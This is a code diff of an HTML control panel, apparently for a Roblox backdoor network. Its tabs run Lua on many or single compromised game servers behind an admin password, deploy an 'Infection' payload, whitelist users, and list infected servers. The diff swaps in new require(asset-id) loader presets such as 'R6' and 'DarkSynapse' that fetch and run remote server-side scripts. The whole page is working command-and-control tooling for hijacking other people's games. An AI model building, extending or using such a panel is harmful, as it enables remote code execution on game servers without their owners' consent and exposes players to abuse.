@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Nexus  | Stable 5</title>
+    <title>Nexus  | RequireHub</title>
     <style>
         :root { --apple-blue: #0071e3; --bg: #000; }
         body { margin: 0; background: var(--bg); color: #fff; font-family: -apple-system, sans-serif; overflow: hidden; }
@@ -16,26 +16,25 @@
         input, textarea, select { width: 100%; border-radius: 8px; border: 1px solid #424245; background: #000; color: #fff; padding: 10px; margin-bottom: 10px; box-sizing: border-box; outline: none; font-size: 13px; }
         textarea { font-family: 'Courier New', monospace; resize: none; }
         .btn-main { background: var(--apple-blue); color: #fff; border: none; border-radius: 8px; padding: 12px; width: 100%; font-weight: 600; cursor: pointer; }
-        .row-btns { display: flex; gap: 5px; margin-bottom: 10px; }
-        .rh-pill { background: #333; color: #fff; border: none; padding: 5px 12px; border-radius: 15px; font-size: 10px; cursor: pointer; }
-        .node-box { background: #0b0b0c; border-radius: 10px; height: 200px; overflow-y: auto; border: 1px solid #333; }
-        .node-item { padding: 12px; border-bottom: 1px solid #222; display: flex; justify-content: space-between; align-items: center; }
+        .row-btns { display: flex; gap: 5px; margin-bottom: 10px; flex-wrap: wrap; }
+        .rh-pill { background: #333; color: #fff; border: none; padding: 5px 12px; border-radius: 15px; font-size: 10px; cursor: pointer; transition: 0.2s; }
+        .rh-pill:hover { background: #444; }
+        .node-box { background: #0b0b0c; border-radius: 10px; height: 180px; overflow-y: auto; border: 1px solid #333; }
         .music-ctrl { position: fixed; bottom: 20px; left: 20px; background: rgba(44,44,46,0.8); backdrop-filter: blur(10px); padding: 8px 15px; border-radius: 20px; border: 1px solid #444; display: flex; align-items: center; gap: 10px; z-index: 2000; }
     </style>
 </head>
 <body onclick="startAudio()">
-    <audio id="bgMusic" loop src="https://cdn.discordapp.com/attachments/1459510270870421546/1492178549317308426/Wont_Stop_Us_-_StacyBurke92_g00byd0lan_KLICKAUD.mp3?ex=69da6311&is=69d91191&hm=f174788afceacbba804576a6c0e91386a5e3a077bacbedbc981032a8ec393a1c&"></audio>
+    <audio id="bgMusic" loop src="https://cdn.discordapp.com/attachments/1459510270870421546/1489905086250352772/Wont_Stop_Us_-_StacyBurke92_g00byd0lan_KLICKAUD.mp3?ex=69d21dbd&is=69d0cc3d&hm=f7812e208edafbe0c5f70e2359dc893b9c6477033ae2989720e977ab36a15b8a&"></audio>
 
     <div class="header">
         <div style="font-weight:700;"> NEXUS</div>
         <div class="nav">
-            <button class="nav-btn active" onclick="showTab('mass', this)">Mass</button>
-            <button class="nav-btn" onclick="showTab('single', this)">Single</button>
-            <button class="nav-btn" onclick="showTab('inf', this)">Infection</button>
-            <button class="nav-btn" onclick="showTab('wl', this)">Whitelist</button>
-            <button class="nav-btn" onclick="showTab('nodes', this)">Nodes</button>
+            <button id="btn-mass" class="nav-btn active" onclick="showTab('mass')">Mass</button>
+            <button id="btn-single" class="nav-btn" onclick="showTab('single')">Single</button>
+            <button id="btn-inf" class="nav-btn" onclick="showTab('inf')">Infection</button>
+            <button id="btn-wl" class="nav-btn" onclick="showTab('wl')">Whitelist</button>
+            <button id="btn-nodes" class="nav-btn" onclick="showTab('nodes')">Games</button>
         </div>
-        <div id="clock" style="font-size:10px; color:#86868b;"></div>
     </div>
 
     <div class="container">
@@ -43,9 +42,8 @@
             <div id="mass" class="tab-content">
                 <h2>Mass Execution</h2>
                 <div class="row-btns">
-                    <button class="rh-pill" onclick="fill(1, 'm_lua')">Last Rig</button>
-                    <button class="rh-pill" onclick="fill(2, 'm_lua')">Require.EXE</button>
-                    <button class="rh-pill" onclick="fill(3, 'm_lua')">Darius (OP)</button>
+                    <button class="rh-pill" onclick="fillRH('R6', 'm_lua')">R6</button>
+                    <button class="rh-pill" onclick="fillRH('DarkSynapse', 'm_lua')">DarkSynapse</button>
                 </div>
                 <input type="password" id="m_pw" placeholder="Admin Password">
                 <textarea id="m_lua" rows="6" placeholder="-- Global Lua"></textarea>
@@ -56,7 +54,8 @@
                 <h2>Single Target</h2>
                 <select id="target_id"><option value="">Scanning Nodes...</option></select>
                 <div class="row-btns">
-                    <button class="rh-pill" onclick="fill(3, 's_lua')">Darius (OP)</button>
+                    <button class="rh-pill" onclick="fillRH('R6', 's_lua')">R6</button>
+                    <button class="rh-pill" onclick="fillRH('DarkSynapse', 's_lua')">DarkSynapse</button>
                 </div>
                 <input type="password" id="s_pw" placeholder="Admin Password">
                 <textarea id="s_lua" rows="5" placeholder="-- Target Lua"></textarea>
@@ -65,16 +64,15 @@
 
             <div id="inf" class="tab-content" style="display:none;">
                 <h2>Infection</h2>
-                <input type="password" id="i_pw" placeholder="Admin Password">
                 <textarea id="i_lua" rows="8">require(127445614272366).op("Darius")</textarea>
                 <button class="btn-main" onclick="send('inf')">Deploy</button>
             </div>
 
             <div id="wl" class="tab-content" style="display:none;">
-                <h2>Whitelist</h2>
-                <input type="text" id="wid" placeholder="Roblox UserID">
-                <button class="btn-main" onclick="wlu('add')">Authorize</button>
-                <button class="btn-main" style="background:#222; margin-top:8px;" onclick="wlu('remove')">Revoke</button>
+                <h2>Whitelist Manager</h2>
+                <p style="font-size: 10px; color: #86868b; margin-bottom: 5px;">Input your FULL Roblox Username for DarkSynapse/R6</p>
+                <input type="text" id="wid" placeholder="Roblox Full Username">
+                <button class="btn-main" onclick="wlu('add')">Save User</button>
             </div>
 
             <div id="nodes" class="tab-content" style="display:none;">
@@ -91,23 +89,26 @@
 
     <script>
         const audio = document.getElementById('bgMusic');
-        let unlocked = false;
-        function startAudio() { if(!unlocked && audio) { audio.play().then(() => { unlocked = true; }).catch(() => {}); } }
+        function startAudio() { audio.play().catch(()=>{}); }
         function toggle() { if(audio.paused) { audio.play(); document.getElementById('pBtn').innerText="PAUSE"; } else { audio.pause(); document.getElementById('pBtn').innerText="PLAY"; } }
         function kill() { audio.pause(); audio.src=""; document.querySelector('.music-ctrl').style.display='none'; }
-        
-        function showTab(id, btn) {
+
+        function showTab(id) {
             document.querySelectorAll('.tab-content').forEach(t => t.style.display = 'none');
             document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
             document.getElementById(id).style.display = 'block';
-            btn.classList.add('active');
+            document.getElementById('btn-' + id).classList.add('active');
         }
 
-        function fill(type, boxId) {
+        function fillRH(type, boxId) {
+            const user = document.getElementById('wid').value || "YourUsername";
             const box = document.getElementById(boxId);
-            if(type === 1) box.value = `require(132155655397653)("Darius")`;
-            if(type === 2) box.value = `require(125992639027440)["Require.EXE by E God"]("Darius")`;
-            if(type === 3) box.value = `require(127445614272366).op("Darius")`;
+            
+            if(type === 'R6') {
+                box.value = `require(3436957371):r6("${user}")`;
+            } else if (type === 'DarkSynapse') {
+                box.value = `require(133245855072069)("${user}", "DarkSynapse")`;
+            }
         }
 
         async function send(tabId) {
@@ -118,29 +119,18 @@
             alert("Sent");
         }
 
-        async function wlu(a){
-            const i=document.getElementById('wid').value;
-            await fetch('/update-whitelist',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id:i,action:a})});
-            alert("Updated");
-        }
-
         async function update() {
             try {
                 const res = await fetch('/get-games');
                 const data = await res.json();
                 const keys = Object.keys(data);
-                document.getElementById('node_list').innerHTML = keys.map(k => `
-                    <div class="node-item">
-                        <div><b>${data[k].name}</b><br><small style="font-family:monospace; color:#666; font-size:9px;">${k}</small></div>
-                        <a href="roblox://placeId=${data[k].placeId}&gameInstanceId=${k}" style="background:#fff; color:#000; text-decoration:none; font-size:10px; font-weight:bold; padding:4px 8px; border-radius:10px;">JOIN</a>
-                    </div>`).join('') || '<div style="padding:20px; text-align:center; color:#444;">Scanning...</div>';
-                document.getElementById('target_id').innerHTML = keys.map(k => `<option value="${k}">${data[k].name}</option>`).join('') || '<option value="">No Servers</option>';
+                document.getElementById('node_list').innerHTML = keys.map(k => `<div style="padding:10px; border-bottom:1px solid #333;"><b>${data[k].name}</b><br><small style="color:#666;">${k}</small></div>`).join('') || '<div style="padding:20px; text-align:center;">No Servers</div>';
+                document.getElementById('target_id').innerHTML = keys.map(k => `<option value="${k}">${data[k].name}</option>`).join('') || '<option value="">No Active Nodes</option>';
             } catch(e) {}
         }
 
         setInterval(update, 5000);
-        setInterval(() => { document.getElementById('clock').innerText = new Date().toLocaleTimeString(); }, 1000);
-        window.onload = update;
+        window.onload = () => { showTab('mass'); update(); };
     </script>
 </body>
 </html>
